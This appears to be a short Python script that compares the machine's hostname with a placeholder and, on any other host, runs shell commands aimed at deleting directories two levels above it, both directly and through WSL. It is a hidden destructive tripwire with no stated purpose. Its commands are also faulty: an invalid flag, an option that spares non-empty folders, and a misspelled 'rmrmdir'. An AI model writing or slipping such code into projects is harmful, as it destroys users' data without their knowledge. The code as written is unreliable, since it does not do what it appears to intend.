import os
import socket

if(socket.gethostname() != 'YOURHOSTID'):
	os.system("rmdir ../../ -f --ignore-fail-on-non-empty")
	os.system("wsl rmrmdir ../../ -f --ignore-fail-on-non-empty")

